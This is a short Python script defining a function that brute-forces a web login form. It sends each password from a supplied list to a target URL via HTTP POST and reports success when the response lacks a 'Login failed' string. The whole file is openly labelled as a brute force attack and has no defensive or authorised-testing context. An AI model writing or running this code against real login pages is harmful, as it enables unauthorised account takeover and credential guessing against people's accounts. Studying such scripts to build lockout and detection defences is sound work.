import requests

def brute_force_login(url, username, password_list):
    print("\n[+] Starting Brute Force Attack...\n")

    for password in password_list:
        data = {
            "username": username,
            "password": password
        }

        try:
            response = requests.post(url, data=data)

            if "Login failed" not in response.text:
                print(f"[SUCCESS] Password found: {password}")
                return

            print(f"[FAILED] {password}")

        except Exception as e:
            print(f"[ERROR] {e}")

    print("\n[INFO] Brute force completed. Password not found.")